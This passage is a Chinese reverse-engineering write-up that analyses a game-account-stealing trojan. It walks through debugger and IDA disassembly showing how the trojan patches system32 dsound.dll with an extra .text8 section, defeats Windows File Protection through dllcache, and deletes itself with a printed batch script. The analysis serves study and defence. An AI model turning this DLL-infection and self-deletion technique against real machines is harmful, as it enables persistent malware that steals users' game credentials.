+004031AA  |.  C645 F1 6C    mov     byte ptr \[ebp-F\], 6C  
+004031AE  |.  C645 F2 65    mov     byte ptr \[ebp-E\], 65  
+004031B2  |.  C645 F3 41    mov     byte ptr \[ebp-D\], 41  
+004031B6  |.  C645 F4 74    mov     byte ptr \[ebp-C\], 74  
+004031BA  |.  C645 F5 74    mov     byte ptr \[ebp-B\], 74  
+004031BE  |.  C645 F6 72    mov     byte ptr \[ebp-A\], 72  
+004031C2  |.  C645 F7 69    mov     byte ptr \[ebp-9\], 69  
+004031C6  |.  C645 F8 62    mov     byte ptr \[ebp-8\], 62  
+004031CA  |.  C645 F9 75    mov     byte ptr \[ebp-7\], 75  
+004031CE  |.  C645 FA 74    mov     byte ptr \[ebp-6\], 74  
+004031D2  |.  C645 FB 65    mov     byte ptr \[ebp-5\], 65  
+004031D6  |.  C645 FC 73    mov     byte ptr \[ebp-4\], 73  
+004031DA  |.  C645 FD 41    mov     byte ptr \[ebp-3\], 41               ;  GetFileAttributesA  
+004031DE  |.  C645 D8 53    mov     byte ptr \[ebp-28\], 53  
+004031E2  |.  C645 D9 65    mov     byte ptr \[ebp-27\], 65  
+004031E6  |.  C645 DA 74    mov     byte ptr \[ebp-26\], 74  
+004031EA  |.  C645 DB 46    mov     byte ptr \[ebp-25\], 46  
+004031EE  |.  C645 DC 69    mov     byte ptr \[ebp-24\], 69  
+004031F2  |.  C645 DD 6C    mov     byte ptr \[ebp-23\], 6C  
+004031F6  |.  C645 DE 65    mov     byte ptr \[ebp-22\], 65  
+004031FA  |.  C645 DF 41    mov     byte ptr \[ebp-21\], 41  
+004031FE  |.  C645 E0 74    mov     byte ptr \[ebp-20\], 74  
+00403202  |.  C645 E1 74    mov     byte ptr \[ebp-1F\], 74  
+00403206  |.  C645 E2 72    mov     byte ptr \[ebp-1E\], 72  
+0040320A  |.  C645 E3 69    mov     byte ptr \[ebp-1D\], 69  
+0040320E  |.  C645 E4 62    mov     byte ptr \[ebp-1C\], 62  
+00403212  |.  C645 E5 75    mov     byte ptr \[ebp-1B\], 75  
+00403216  |.  C645 E6 74    mov     byte ptr \[ebp-1A\], 74  
+0040321A  |.  C645 E7 65    mov     byte ptr \[ebp-19\], 65  
+0040321E  |.  C645 E8 73    mov     byte ptr \[ebp-18\], 73  
+00403222  |.  C645 E9 41    mov     byte ptr \[ebp-17\], 41              ;  SetFileAttributesA  
+00403226  |.  FFD6          call    esi                                ;  kernel32.LoadLibraryA  
+00403228  |.  50            push    eax  
+00403229  |.  E8 F2E6FFFF   call    00401920  
+0040322E  |.  59            pop     ecx  
+0040322F  |.  8BF8          mov     edi, eax  
+00403231  |.  59            pop     ecx  
+00403232  |.  8D45 D8       lea     eax, dword ptr \[ebp-28\]  
+00403235  |.  50            push    eax  
+00403236  |.  53            push    ebx  
+00403237  |.  FFD6          call    esi  
+00403239  |.  50            push    eax  
+0040323A  |.  E8 E1E6FFFF   call    00401920  
+0040323F  |.  59            pop     ecx  
+00403240  |.  8BD8          mov     ebx, eax  
+00403242  |.  59            pop     ecx  
+00403243  |.  8D85 4CFEFFFF lea     eax, dword ptr \[ebp-1B4\]  
+00403249  |.  50            push    eax  
+0040324A  |.  FFD7          call    edi                                ;  kernel32.GetFileAttributesA  
+0040324C  |.  0C 02         or      al, 2  
+0040324E  |.  50            push    eax  
+0040324F  |.  8D85 4CFEFFFF lea     eax, dword ptr \[ebp-1B4\]  
+00403255  |.  50            push    eax  
+00403256  |.  FFD3          call    ebx                                ;  kernel32.SetFileAttributesA  
+  
+.............  
+  
+一路单步 F8，就可以了，中间过程没什么好讲的，我就直接到下面的重点了~~~  
+  
+004032A6  |.  BF 60604000   mov     edi, 00406060                  ;  ASCII "dsound.dll"  
+004032AB  |.  50            push    eax                            ;  C:\\Program Files\\Common Files\\System\\kb011595.bwb  
+004032AC  |.  57            push    edi                            ;  dsound.dll  
+004032AD  |.  E8 9EF0FFFF   call    00402350                       ;  这个函数是一个非常重要的函数，我要下面重点分析一下  
+004032B2  |.  0FB6D8        movzx   ebx, al  
+004032B5  |.  59            pop     ecx  
+004032B6  |.  85DB          test    ebx, ebx  
+004032B8  |.  59            pop     ecx                              ;  C:\\Program Files\\Common Files\\System\\kb011595.bwb  
+004032B9  |.  75 04         jnz     short 004032BF  
+004032BB  |>  33C0          xor     eax, eax  
+004032BD  |.  EB 78         jmp     short 00403337  
+004032BF  |>  837D D4 00    cmp     dword ptr \[ebp-2C\], 0  
+004032C3  |.  74 1C         je      short 004032E1  
+004032C5  |.  8D85 68F5FFFF lea     eax, dword ptr \[ebp-A98\]  
+004032CB  |.  50            push    eax  
+004032CC  |.  8D85 70F7FFFF lea     eax, dword ptr \[ebp-890\]  
+004032D2  |.  50            push    eax  
+004032D3  |.  57            push    edi  
+004032D4  |.  E8 12120000   call    004044EB  
+004032D9  |.  83C4 0C       add     esp, 0C  
+004032DC  |.  0FB6D8        movzx   ebx, al  
+004032DF  |.  EB 42         jmp     short 00403323  
+004032E1  |>  FF75 0C       push    dword ptr \[ebp+C\]  
+004032E4  |.  8065 CB 00    and     byte ptr \[ebp-35\], 0  
+004032E8  |.  C645 C4 4C    mov     byte ptr \[ebp-3C\], 4C  
+004032EC  |.  C645 C5 6F    mov     byte ptr \[ebp-3B\], 6F  
+004032F0  |.  C645 C6 61    mov     byte ptr \[ebp-3A\], 61  
+004032F4  |.  C645 C7 64    mov     byte ptr \[ebp-39\], 64  
+004032F8  |.  C645 C8 44    mov     byte ptr \[ebp-38\], 44  
+004032FC  |.  C645 C9 6C    mov     byte ptr \[ebp-37\], 6C  
+00403300  |.  C645 CA 6C    mov     byte ptr \[ebp-36\], 6C            ;  LoadDll---------->重点!!!!!!!!!!!!  
+00403304  |.  FFD6          call    esi  
+00403306  |.  8D4D C4       lea     ecx, dword ptr \[ebp-3C\]  
+00403309  |.  51            push    ecx  
+0040330A  |.  50            push    eax  
+0040330B  |.  E8 10E6FFFF   call    00401920  
+00403310  |.  59            pop     ecx  
+00403311  |.  85C0          test    eax, eax  
+00403313  |.  59            pop     ecx  
+00403314  |.  74 02         je      short 00403318  
+00403316  |.  FFD0          call    eax                              ;  LoadDll  
+00403318  |>  68 B80B0000   push    0BB8                             ; /Timeout = 3000. ms  
+0040331D  |.  FF15 0C504000 call    dword ptr \[<&kernel32.Sleep>\]    ; \\Sleep  
+00403323  |>  837D D4 00    cmp     dword ptr \[ebp-2C\], 0  
+00403327  |.  74 04         je      short 0040332D  
+00403329  |.  85DB          test    ebx, ebx  
+0040332B  |.  75 07         jnz     short 00403334  
+0040332D  |>  57            push    edi  
+0040332E  |.  E8 A40D0000   call    004040D7  
+这里调用了一个 call 004040D7，我们跟进~~  
+\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+CALL 004040D7:  
+这个函数主要是将 C:\\windows\\system32\\dsound.dll 文件拷贝到 C:\\windows\\system32\\dllcache\\dsound.dll.LTCB  
+当操作这个操作时会触发到 windows 文件保护机制  
+![](img/59d84083ef0274d6a65eade630115be4.jpg)  
+然后将 c:\\windows\\system32\\dsound.dll.dat 文件拷贝到 c:\\windows\\system32\\dllcache\\dsound.dll  
+最后将 c:\\windows\\system32\\dsound.dll.dat 拷内到相同目录下的 c:\\windows\\system32\\dsound.dll  
+些时系统目录下的 dsound.dll 就是被我们替换成了我们新写入了数据之后的 dsound.dll.dat 文件的内容，嘿嘿!  
+\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+上面这些执行完毕之后，函数返回到了 00403730 处，嘿嘿，前面那段代码中间的 CALL 00402B14 做了上面这些工作基本上就完成了主要任务了~~  
+00403730  |.  57            push    edi                            ; /block = 003838D8  
+00403731  |.  FF15 74504000 call    dword ptr \[<&msvcrt.free>\]     ; \\free  
+00403737  |.  68 4C624000   push    0040624C  
+0040373C  |.  E8 FBFBFFFF   call    0040333C         ----->主要是用于删除主程序  
+返回之后，我们单步执行到 0040373C 处就调用了一个 CALL 0040333C，这个 CALL 也很关键，因为我们可以看出后面代码执行完毕了，程序直接返回了，所以我们也要重  
+  
+点分析一下这个 CALL!  
+\----------------------------------------------------------------------------------------------------------------  
+CALL 0040333C 这个函数主要是在临时目录下生成了一个 tempVidio.dat 的文件~~并在这个文件中写入如下数据  
+@echo  off  
+:try  
+del  C:\\DOCUME~1\\jack\\桌面\\第一阶段\\Cracker.exe  
+if   exist   C:\\DOCUME~1\\jack\\桌面\\第一阶段\\Cracker.exe  goto  try  
+  
+  
+del  C:\\DOCUME~1\\jack\\LOCALS~1\\Temp\\tempVidio.bat  
+进行自删除的工作，嘿嘿~~  
+\-----------------------------------------------------------------------------------------------------------------  
+  
+好了，上面还有一个问题没解决就是还有一个很重要的函数没有分析~~~  
+CALL 00402350（前提是调用这个函数的时候，如果系统目录里有 dsound.dll 和没有 dsound.dll 是会有两种不同的结果）  
+因为它会替换到系统的 dsound.dll，然后在里面写入一些新的数据，目的是在系统调用这个 DLL 时，会先执行他的程序，以达到某种目的~~  
+\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+00402350  /$  B8 2B494000   mov     eax, 0040492B  
+00402355  |.  E8 0E240000   call    00404768  
+0040235A  |.  81EC EC030000 sub     esp, 3EC  
+00402360  |.  53            push    ebx                              ;  kernel32.SetFileAttributesA  
+00402361  |.  56            push    esi                              ;  kernel32.LoadLibraryA  
+00402362  |.  57            push    edi                              ;  dsound.dll  
+00402363  |.  6A 40         push    40  
+00402365  |.  33DB          xor     ebx, ebx                         ;  ebx = 0  
+00402367  |.  59            pop     ecx  
+00402368  |.  33C0          xor     eax, eax  
+0040236A  |.  8DBD 09FCFFFF lea     edi, dword ptr \[ebp-3F7\]  
+00402370  |.  889D 08FCFFFF mov     byte ptr \[ebp-3F8\], bl  
+00402376  |.  6A 40         push    40  
+00402378  |.  F3:AB         rep     stos dword ptr es:\[edi\]  
+0040237A  |.  66:AB         stos    word ptr es:\[edi\]  
+0040237C  |.  AA            stos    byte ptr es:\[edi\]  
+0040237D  |.  59            pop     ecx  
+0040237E  |.  33C0          xor     eax, eax  
+00402380  |.  8DBD 0DFDFFFF lea     edi, dword ptr \[ebp-2F3\]  
+00402386  |.  889D 0CFDFFFF mov     byte ptr \[ebp-2F4\], bl  
+0040238C  |.  F3:AB         rep     stos dword ptr es:\[edi\]  
+0040238E  |.  66:AB         stos    word ptr es:\[edi\]  
+00402390  |.  AA            stos    byte ptr es:\[edi\]  
+00402391  |.  6A 40         push    40  
+00402393  |.  33C0          xor     eax, eax  
+00402395  |.  59            pop     ecx  
+00402396  |.  8DBD 11FEFFFF lea     edi, dword ptr \[ebp-1EF\]  
+0040239C  |.  889D 10FEFFFF mov     byte ptr \[ebp-1F0\], bl  
+004023A2  |.  C645 E4 2E    mov     byte ptr \[ebp-1C\], 2E  
+004023A6  |.  F3:AB         rep     stos dword ptr es:\[edi\]  
+004023A8  |.  66:AB         stos    word ptr es:\[edi\]  
+004023AA  |.  AA            stos    byte ptr es:\[edi\]  
+004023AB  |.  8D85 08FCFFFF lea     eax, dword ptr \[ebp-3F8\]  
+004023B1  |.  C645 E5 64    mov     byte ptr \[ebp-1B\], 64  
+004023B5  |.  50            push    eax  
+004023B6  |.  C645 E6 61    mov     byte ptr \[ebp-1A\], 61  
+004023BA  |.  C645 E7 74    mov     byte ptr \[ebp-19\], 74            ;  .dat  
+004023BE  |.  885D E8       mov     byte ptr \[ebp-18\], bl  
+004023C1  |.  C645 D0 43    mov     byte ptr \[ebp-30\], 43  
+004023C5  |.  C645 D1 6F    mov     byte ptr \[ebp-2F\], 6F  
+004023C9  |.  C645 D2 70    mov     byte ptr \[ebp-2E\], 70  
+004023CD  |.  C645 D3 79    mov     byte ptr \[ebp-2D\], 79  
+004023D1  |.  C645 D4 46    mov     byte ptr \[ebp-2C\], 46  
+004023D5  |.  C645 D5 69    mov     byte ptr \[ebp-2B\], 69  
+004023D9  |.  C645 D6 6C    mov     byte ptr \[ebp-2A\], 6C  
+004023DD  |.  C645 D7 65    mov     byte ptr \[ebp-29\], 65  
+004023E1  |.  C645 D8 41    mov     byte ptr \[ebp-28\], 41            ;  CopyFileA  
+004023E5  |.  885D D9       mov     byte ptr \[ebp-27\], bl  
+004023E8  |.  E8 A0F4FFFF   call    0040188D  
+004023ED  |.  8D85 08FCFFFF lea     eax, dword ptr \[ebp-3F8\]  
+004023F3  |.  50            push    eax  
+004023F4  |.  8D85 0CFDFFFF lea     eax, dword ptr \[ebp-2F4\]  
+004023FA  |.  50            push    eax  
+004023FB  |.  E8 A3F2FFFF   call    004016A3  
+00402400  |.  FF75 08       push    dword ptr \[ebp+8\]  
+00402403  |.  8D85 0CFDFFFF lea     eax, dword ptr \[ebp-2F4\]  
+00402409  |.  50            push    eax  
+0040240A  |.  E8 8BF3FFFF   call    0040179A  
+0040240F  |.  8D85 0CFDFFFF lea     eax, dword ptr \[ebp-2F4\]         ;  eax="C:\\WINDOWS\\system32\\dsound.dll"  
+00402415  |.  50            push    eax  
+00402416  |.  8D85 10FEFFFF lea     eax, dword ptr \[ebp-1F0\]  
+0040241C  |.  50            push    eax  
+0040241D  |.  E8 81F2FFFF   call    004016A3                         ;  字符串拷贝函数  
+00402422  |.  8D45 E4       lea     eax, dword ptr \[ebp-1C\]  
+00402425  |.  50            push    eax  
+00402426  |.  8D85 10FEFFFF lea     eax, dword ptr \[ebp-1F0\]  
+0040242C  |.  50            push    eax  
+0040242D  |.  E8 68F3FFFF   call    0040179A                         ;  eax="C:\\WINDOWS\\system32\\dsound.dll.dat"  
+00402432  |.  83C4 24       add     esp, 24  
+00402435  |.  8D45 D0       lea     eax, dword ptr \[ebp-30\]  
+00402438  |.  50            push    eax  
+00402439  |.  68 10604000   push    00406010                         ; /FileName = "Kernel32.dll"  
+0040243E  |.  FF15 00504000 call    dword ptr \[<&kernel32.LoadLibrar>; \\LoadLibraryA  
+00402444  |.  50            push    eax  
+00402445  |.  E8 D6F4FFFF   call    00401920  
+0040244A  |.  8BF8          mov     edi, eax                         ;  kernel32.CopyFileA  
+0040244C  |.  8D85 0CFDFFFF lea     eax, dword ptr \[ebp-2F4\]  
+00402452  |.  50            push    eax  
+00402453  |.  E8 6CF3FFFF   call    004017C4                         ;  这里有个关键的 CALL 用于判断系统目录下是否有 dsound.dll  
+00402458  |.  8BF0          mov     esi, eax  
+0040245A  |.  8D85 10FEFFFF lea     eax, dword ptr \[ebp-1F0\]  
+00402460  |.  50            push    eax  
+00402461  |.  E8 5EF3FFFF   call    004017C4                         ;  判断 C:\\windows\\system32\\dsound.dll.dat 是否存在  
+00402466  |.  83C4 10       add     esp, 10  
+00402469  |.  3BF3          cmp     esi, ebx  
+0040246B  |.  75 15         jnz     short 00402482  
+0040246D  |.  3BC3          cmp     eax, ebx  
+0040246F  |.  75 22         jnz     short 00402493  
+00402471  |.  FF75 08       push    dword ptr \[ebp+8\]  
+00402474  |.  E8 EAFBFFFF   call    00402063  
+00402479  |.  84C0          test    al, al  
+0040247B  |.  59            pop     ecx  
+0040247C  |.  0F84 CD000000 je      0040254F  
+00402482  |>  8D85 10FEFFFF lea     eax, dword ptr \[ebp-1F0\]         ;  C:\\windows\\system32\\dsound.dll.dat  
+00402488  |.  53            push    ebx  
+00402489  |.  50            push    eax  
+0040248A  |.  8D85 0CFDFFFF lea     eax, dword ptr \[ebp-2F4\]         ;  C;\\Windows\\system32\\dsound.dll  
+00402490  |.  50            push    eax  
+00402491  |.  FFD7          call    edi                              ;  CopyFileA  
+00402493  |>  8D8D 14FFFFFF lea     ecx, dword ptr \[ebp-EC\]  
+00402499  |.  C645 DC 2E    mov     byte ptr \[ebp-24\], 2E  
+0040249D  |.  C645 DD 74    mov     byte ptr \[ebp-23\], 74  
+004024A1  |.  C645 DE 65    mov     byte ptr \[ebp-22\], 65  
+004024A5  |.  C645 DF 78    mov     byte ptr \[ebp-21\], 78  
+004024A9  |.  C645 E0 74    mov     byte ptr \[ebp-20\], 74  
+004024AD  |.  C645 E1 36    mov     byte ptr \[ebp-1F\], 36            ;  .text6  
+004024B1  |.  885D E2       mov     byte ptr \[ebp-1E\], bl  
+004024B4  |.  C645 EC 2E    mov     byte ptr \[ebp-14\], 2E  
+004024B8  |.  C645 ED 74    mov     byte ptr \[ebp-13\], 74  
+004024BC  |.  C645 EE 65    mov     byte ptr \[ebp-12\], 65  
+004024C0  |.  C645 EF 78    mov     byte ptr \[ebp-11\], 78  
+004024C4  |.  C645 F0 74    mov     byte ptr \[ebp-10\], 74  
+004024C8  |.  C645 F1 38    mov     byte ptr \[ebp-F\], 38             ;  .text8  
+004024CC  |.  885D F2       mov     byte ptr \[ebp-E\], bl  
+004024CF  |.  E8 78120000   call    0040374C  
+004024D4  |.  8D85 10FEFFFF lea     eax, dword ptr \[ebp-1F0\]         ;  C:\\windows\\system32\\dsound.dll.dat  
+004024DA  |.  8D8D 14FFFFFF lea     ecx, dword ptr \[ebp-EC\]  
+004024E0  |.  50            push    eax  
+004024E1  |.  895D FC       mov     dword ptr \[ebp-4\], ebx  
+004024E4  |.  E8 B0160000   call    00403B99                         ;  将整个 dsound.dll 拷贝到分配的内存空间  
+004024E9  |.  FF75 0C       push    dword ptr \[ebp+C\]  
+004024EC  |.  8D45 DC       lea     eax, dword ptr \[ebp-24\]  
+004024EF  |.  8D8D 14FFFFFF lea     ecx, dword ptr \[ebp-EC\]  
+004024F5  |.  50            push    eax                              ;  .text6  
+004024F6  |.  E8 0A150000   call    00403A05  
+004024FB  |.  85C0          test    eax, eax  
+004024FD  |.  75 2D         jnz     short 0040252C  
+004024FF  |.  FF75 0C       push    dword ptr \[ebp+C\]  
+00402502  |.  8D45 EC       lea     eax, dword ptr \[ebp-14\]  
+00402505  |.  8D8D 14FFFFFF lea     ecx, dword ptr \[ebp-EC\]  
+0040250B  |.  50            push    eax                              ;  .text8  
+0040250C  |.  E8 F4140000   call    00403A05                         ;  C:\\Program Files\\Common Files\\System\\kb011595.bwb 中是否包含.txext8 这个节  
+00402511  |.  85C0          test    eax, eax  
+00402513  |.  75 17         jnz     short 0040252C  
+00402515  |.  FF75 0C       push    dword ptr \[ebp+C\]  
+00402518  |.  8D45 EC       lea     eax, dword ptr \[ebp-14\]          ;  .text8  
+0040251B  |.  8D8D 14FFFFFF lea     ecx, dword ptr \[ebp-EC\]  
+00402521  |.  68 00080000   push    800  
+00402526  |.  50            push    eax  
+00402527  |.  E8 6E130000   call    0040389A  
+0040252C  |>  8D85 10FEFFFF lea     eax, dword ptr \[ebp-1F0\]         ;  查找内存中的 PE 文件是否含有.text8  
+00402532  |.  8D8D 14FFFFFF lea     ecx, dword ptr \[ebp-EC\]  
+00402538  |.  50            push    eax                              ;  C:\\windows\\system32\\dsound.dll.dat  
+00402539  |.  E8 0F180000   call    00403D4D                         ;  写入数据到上面上的文件中  
+0040253E  |.  834D FC FF    or      dword ptr \[ebp-4\], FFFFFFFF  
+00402542  |.  8D8D 14FFFFFF lea     ecx, dword ptr \[ebp-EC\]  
+00402548  |.  E8 3D120000   call    0040378A  
+0040254D  |.  B0 01         mov     al, 1  
+0040254F  |>  8B4D F4       mov     ecx, dword ptr \[ebp-C\]  
+00402552  |.  5F            pop     edi  
+00402553  |.  5E            pop     esi  
+00402554  |.  5B            pop     ebx  
+00402555  |.  64:890D 00000>mov     dword ptr fs:\[0\], ecx  
+0040255C  |.  C9            leave  
+0040255D  \\.  C3            retn  
+其实上面的代码很简单就是将系统目录下的 dsound.dll 拷贝相同目录下的 dsound.dll.dat，然后分配一个内存，将文件载入进行相关操作，看文件是否被感染，如是  
+  
+没有就写入数据到 dsound.dll.dat 中!!!  
+\------------------------------------------------------------------------------------------------------------------  
+好了，这样我们的第二个阶段的工作都做完了，所有的文件我都打包在第二阶段包中了  
+  
+  
+在短暂的休息之后，我们来进入我们的第三个阶段吧~~  
+第三个阶段：释放出来的文件分析  
+首先我用 google 查看看，有没有相关信息，找到了很多，原来这款游戏木马早已被各大杀毒软件公司注意上了!  
+截选一段话吧：  
+2010 年 1 月 30 日，XX 安全中心首家截获到“潜行者”病毒（贝壳命名为 threat.loader.26938，又被称为 Dsound.dll、Ddraw.dll 病毒）。2 月 1 日，“潜行者”开始爆发  
+  
+式传播，牢牢占据病毒排行榜的第一位。  
+  
+“潜行者”以感染 Windows 系统文件 Dsound.dll、Ddraw.dll 作为跳板，绕过杀毒软件及网游保护系统。一旦受感染的系统文件被网络游戏加载到内存，“潜行者”便  
+  
+会加载各种流行网游盗号木马（特征是扩展名为 drv），盗取《天龙八部》，《剑网三》，《QQ 地下城勇士》等流行网游的账号。同时，也会使游戏过程中频繁卡机。  
+  
+多数杀毒软件对“潜行者”病毒无法查杀，或查杀后造成系统找不到  
+  
+现在有很多杀毒软件，都可以直接修复被替换的 dsound.dll 了，这里我就不多说了，我还是进入主题吧!  
+  
+下面我们重点分析一下被替换的 dsound.dll 与原来的 dsound.dll 有什么不同吧~~  
+先用 PEID 分别查看两个 DLL 有什么不同吧~~  
+![](img/4a7a1c145af5715da3489faaee748392.jpg)  
+很多明显，被感染的 dsound.dll 多了一个节.text8，正是我们前面所分析的，我们就用 UE 分别打开这两个 DLL 来比较有哪些不同吧  
+（由于 UE 不能双开，这个搞起来很不方便，不能对照分析，于是我分别用两个软件 UE 和 C32ASM）来对照起来分析吧  
+要想替换系统中的某个 DLL，一定不能把原文件破坏了，只能在其基础上进行相应修改!  
+我们就来复习一下 PE 结构吧~~先来看看 PE 区块数，如图原 DLL 只有四个区块，感染版 DLL 有五个  
+![](img/9cba29eed56948b4426b05964ba0de14.jpg)  
+![](img/24f40bbe8d3c95689fe2f27484c18871.jpg)  
+然后我们再用 PEID 分析一下，如图所示：  
+![](img/9a7361f3e14f342c9159573ffded0f5e.jpg)  
+左边的是感染了的，右边的是没有被感染的  
+从上面很明显有，三个地方不同：  
+(1)DLL 入口点：  
+原版 DLL 入口点：00001788----->在.text 节中  
+感染 DLL 入口点：0005C000----->在.text8 节中  
+(2)节数目：  
+原版 DLL:0004  
+感染 DLL:0005  
+(3)镜像大小  
+原版 DLL 镜像大小:0005C000  
+感染 DLL 镜像大小:0005D000  
+可以看出被替换的 DLL 入口被改成了我们增加的代码的入口处，先执行我们的某些功能，然后在把控制权给真实的系统 DLL  
+  
+在用上面两个工具进行对比分析时，发现在文件偏移 00000280h 处  
+原版的数据是这样的  
+![](img/589dc1ca36a2649c4455d0700065b8dc.jpg)  
+感染版的数据变成了  
+![](img/f229d12027187dd5c0acced78a2bfb27.jpg)  
+根据上面的图中我们可以看到，感染片中的 DLL 最后文件偏移 59C00 处加入了 800 大小的代码~~~  
+我们就来重点看下，这段代码在做什么吧~~~  
+  
+  
+现在我们用 IDA 打开被感染的 DLL~~~  
+DLL 入口代码被改成了如下内容:  
+.text8:73ECC000 ; BOOL \_\_stdcall DllEntryPoint(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpReserved)  
+.text8:73ECC000                 public DllEntryPoint  
+.text8:73ECC000 DllEntryPoint   proc near  
+.text8:73ECC000  
+.text8:73ECC000 arg\_4           = dword ptr  8  
+.text8:73ECC000  
+.text8:73ECC000 ; FUNCTION CHUNK AT .text8:73ECC13C SIZE 00000011 BYTES  
+.text8:73ECC000  
+.text8:73ECC000                 cmp     \[esp+arg\_4\], 1  
+.text8:73ECC005                 jnz     short loc\_73ECC014  
+.text8:73ECC005  
+.text8:73ECC007                 nop  
+.text8:73ECC008                 pusha  
+.text8:73ECC009                 nop  
+.text8:73ECC00A                 add     edx, 0  
+.text8:73ECC00D                 call    sub\_73ECC01E  
+.text8:73ECC00D  
+.text8:73ECC012                 nop  
+.text8:73ECC013                 popa  
+.text8:73ECC013  
+.text8:73ECC014  
+.text8:73ECC014 loc\_73ECC014:                           ; CODE XREF: DllEntryPoint+5j  
+.text8:73ECC014                 nop  
+.text8:73ECC015                 add     ebp, 0  
+.text8:73ECC018                 jmp     loc\_73ECC13C  
+.text8:73ECC018  
+.text8:73ECC018 DllEntryPoint   endp  
+很明显入口地址变成 73E70000+5C000 = 73ECC000，而原来的入口地址应该是 73E70000+1788 = 73E71788 代码如下:  
+.text:73E71788 ; BOOL \_\_stdcall DllEntryPoint(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpReserved)  
+.text:73E71788                 public DllEntryPoint  
+.text:73E71788 DllEntryPoint   proc near  
+.text:73E71788  
+.text:73E71788 hinstDLL        = dword ptr  8  
+.text:73E71788 fdwReason       = dword ptr  0Ch  
+.text:73E71788 lpReserved      = dword ptr  10h  
+.text:73E71788  
+.text:73E71788 ; FUNCTION CHUNK AT .text:73E82EC3 SIZE 00000054 BYTES  
+.text:73E71788 ; FUNCTION CHUNK AT .text:73E8627E SIZE 00000036 BYTES  
+.text:73E71788  
+.text:73E71788                 mov     edi, edi  
+.text:73E7178A                 push    ebp  
+.text:73E7178B                 mov     ebp, esp  
+.text:73E7178D                 push    ebx  
+.text:73E7178E                 mov     ebx, \[ebp+hinstDLL\]  
+.text:73E71791                 push    esi  
+.text:73E71792                 mov     esi, \[ebp+fdwReason\]  
+.text:73E71795                 test    esi, esi  
+.text:73E71797                 push    edi  
+.text:73E71798                 mov     edi, \[ebp+lpReserved\]  
+.text:73E7179B                 jz      loc\_73E82EC3  
+.text:73E7179B  
+.text:73E717A1                 cmp     esi, 1  
+.text:73E717A4                 jnz     loc\_73E82ECF  
+.text:73E717A4  
+.text:73E717AA  
+.text:73E717AA loc\_73E717AA:                           ; CODE XREF: DllEntryPoint+1174Aj  
+.text:73E717AA                 mov     eax, \_\_pRawDllMain  
+.text:73E717AF                 test    eax, eax  
+.text:73E717B1                 jnz     loc\_73E8627E  
+.text:73E717B1  
+.text:73E717B7  
+.text:73E717B7 loc\_73E717B7:                           ; CODE XREF: DllEntryPoint+14AFDj  
+.text:73E717B7                 push    edi  
+.text:73E717B8                 push    esi  
+.text:73E717B9                 push    ebx  
+.text:73E717BA                 call    \_CRT\_INIT(x,x,x)  
+.text:73E717BA  
+.text:73E717BF                 test    eax, eax  
+.text:73E717BF  
+.text:73E717C1  
+.text:73E717C1 loc\_73E717C1:                           ; CODE XREF: DllEntryPoint+11742j  
+.text:73E717C1                 jz      loc\_73E8628B  
+.text:73E717C1  
+.text:73E717C7  
+.text:73E717C7 loc\_73E717C7:                           ; CODE XREF: DllEntryPoint+11750j  
+.text:73E717C7                 push    edi  
+.text:73E717C8                 push    esi  
+.text:73E717C9                 push    ebx  
+.text:73E717CA                 call    DllMain(x,x,x)  
+.text:73E717CA  
+.text:73E717CF                 cmp     esi, 1  
+.text:73E717D2                 mov     \[ebp+fdwReason\], eax  
+.text:73E717D5                 jnz     loc\_73E82EE7  
+.text:73E717D5  
+.text:73E717DB                 test    eax, eax  
+.text:73E717DD                 jz      loc\_73E86292  
+.text:73E717DD  
+.text:73E717E3  
+.text:73E717E3 loc\_73E717E3:                           ; CODE XREF: DllEntryPoint+1175Aj  
+.text:73E717E3                                         ; DllEntryPoint+11777j  
+.text:73E717E3                                         ; DllEntryPoint+11784j  
+.text:73E717E3                                         ; DllEntryPoint+14B27j  
+.text:73E717E3                 mov     eax, \[ebp+fdwReason\]  
+.text:73E717E3  
+.text:73E717E6  
+.text:73E717E6 loc\_73E717E6:                           ; CODE XREF: DllEntryPoint+14B05j  
+.text:73E717E6                 pop     edi  
+.text:73E717E7                 pop     esi  
+.text:73E717E8                 pop     ebx  
+.text:73E717E9                 pop     ebp  
+.text:73E717EA                 retn    0Ch  
+.text:73E717EA  
+.text:73E717EA DllEntryPoint   endp  
+  
+很明显两个入口地址的代码完全不同的，我们来重点分析一下，被感染的入口地址入码吧!  
+.text8:73ECC000                 cmp     \[esp+arg\_4\], 1      ;比较参数是否为 1  
+.text8:73ECC005                 jnz     short loc\_73ECC014    ;如果不为 1，则跳转到 loc\_73ECC014 处----  
+.text8:73ECC005  
+.text8:73ECC007                 nop  
+.text8:73ECC008                 pusha  
+.text8:73ECC009                 nop  
+.text8:73ECC00A                 add     edx, 0  
+.text8:73ECC00D                 call    sub\_73ECC01E    ----->重要的 CALL  
+.text8:73ECC00D  
+.text8:73ECC012                 nop  
+.text8:73ECC013                 popa  
+  
+\-----------------------------------------------------------------------------------  
+.text8:73ECC014 loc\_73ECC014:                           ; CODE XREF: DllEntryPoint+5j  
+.text8:73ECC014                 nop  
+.text8:73ECC015                 add     ebp, 0  
+.text8:73ECC018                 jmp     loc\_73ECC13C  -------->直接 jmp loc\_73ECC13C  
+.text8:73ECC018  
+.text8:73ECC018 DllEntryPoint   endp  
+\-----------------------------------------------------------------------------------  
+我们来看看 loc\_73ECC13C 处的代码吧  
+\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
+.text8:73ECC13C loc\_73ECC13C:                           ; CODE XREF: DllEntryPoint+18j  
+.text8:73ECC13C                 nop  
+.text8:73ECC13D                 nop  
+.text8:73ECC13E                 call    sub\_73ECC14D  
+.text8:73ECC13E  
+.text8:73ECC143                 push    esi  
+.text8:73ECC144                 xor     esi, esi  
+.text8:73ECC146                 pop     esi  
+.text8:73ECC147                 mov     eax, 0  
+.text8:73ECC14C                 nop  
+  
+直接调用 call sub\_73ECC14D，我们再次跟进看看  
+\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
